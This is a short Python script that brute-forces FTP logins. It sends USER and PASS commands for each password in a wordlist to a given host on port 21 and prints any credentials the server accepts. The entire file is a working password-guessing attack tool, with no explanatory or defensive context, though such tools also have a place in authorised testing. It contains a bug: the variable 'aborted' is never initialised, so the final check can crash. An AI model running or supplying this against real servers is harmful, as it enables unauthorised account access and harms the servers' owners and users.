#!/usr/bin/python
import socket, sys
from pathlib import Path

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <HOST> <USER> <WORDLIST>")
    sys.exit(1)

target = sys.argv[1]

try:
    with Path(sys.argv[3]).open(mode="r", encoding="utf-8") as file:
        wordlist = [line.strip() for line in file if line.strip()]

except OSError as e:
    print(f"Error opening the wordlist: {e}")
    sys.exit(1)

if not wordlist:
    print("Invalid wordlist.")
    sys.exit(1)

try:
    results = socket.getaddrinfo(target, 21, socket.AF_UNSPEC, socket.SOCK_STREAM)

except socket.gaierror as error:
    print(f"Error resolving: {error}")
    sys.exit(1)

family, type_, proto, _, sockaddr = results[0]

def new_connection():
    sock = socket.socket(family, type_, proto)
    sock.settimeout(5)
    sock.connect(sockaddr)
    sock.recv(1024)
    return sock

print("Performing bruteforce on FTP...")
try:
    sock = new_connection()
except (socket.timeout, ConnectionRefusedError, OSError) as e:
    print(f"Error connecting to target: {e}")
    sys.exit(1)

found = False

for word in wordlist:
    try:
        sock.send(f"USER {sys.argv[2]}\r\n".encode())
        sock.recv(1024)
        sock.send(f"PASS {word}\r\n".encode())
        resp = sock.recv(1024).decode(errors="ignore")

        if resp.startswith("230"):
            print(f"Credentials found! -> {sys.argv[2]}:{word}")
            sock.send(b"QUIT\r\n")
            found = True
            break

    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"Error testing '{word}': {e}")
        try:
            sock.close()
        except OSError:
            pass
        try:
            sock = new_connection()
            print("Reconnected! Continuing Bruteforce...")
        except (socket.timeout, ConnectionRefusedError, OSError) as e2:
            print(f"Error reconnecting: {e2}")
            aborted = True
            break
        continue

sock.close()

if not found:
    if aborted:
        print("Bruteforce aborted due to connection error.")
    else:
        print("No credentials found.")
